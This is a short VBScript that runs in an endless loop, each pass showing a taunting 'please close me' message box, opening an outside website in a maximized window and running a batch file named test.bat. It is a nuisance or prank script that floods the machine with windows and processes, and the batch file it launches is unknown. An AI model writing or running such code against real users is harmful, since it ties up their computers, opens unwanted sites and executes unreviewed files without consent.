do
	a=msgbox("please close me,hahahah")
	Set Sh = WScript.CreateObject("WScript.Shell")
	Sh.Run "http://www.ldgcar.com/",3
	Sh.Run "test.bat"

loop